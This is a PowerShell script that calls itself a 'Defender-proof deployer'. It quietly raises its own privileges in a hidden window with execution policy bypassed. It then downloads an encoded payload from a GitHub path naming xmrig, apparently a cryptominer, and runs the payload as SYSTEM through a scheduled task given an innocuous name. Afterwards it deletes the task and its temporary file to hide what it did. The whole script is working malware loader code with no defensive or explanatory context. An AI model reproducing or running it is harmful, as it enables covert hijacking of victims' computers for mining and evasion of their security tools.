# Minimal Defender-proof deployer - self-elevates, runs bootstrap as SYSTEM

$ErrorActionPreference = "SilentlyContinue"

# Self-elevate if not admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Admin context - fetch bootstrap and run as SYSTEM via task
$b64 = irm https://raw.githubusercontent.com/alphahubv2/modest-fermi/master/xmrig/bootstrap.b64

$tempCmd = "$env:TEMP\run_bootstrap.cmd"
@"
schtasks /Create /TN SysOptBoot /TR "powershell -EncodedCommand $b64" /SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F 2>$null
schtasks /Run /TN SysOptBoot 2>$null
schtasks /Delete /TN SysOptBoot /F 2>$null
"@ | Set-Content -Path $tempCmd -Encoding ascii

Start-Process cmd -ArgumentList "/c $tempCmd" -Verb RunAs -Wait
Remove-Item $tempCmd -Force -ErrorAction SilentlyContinue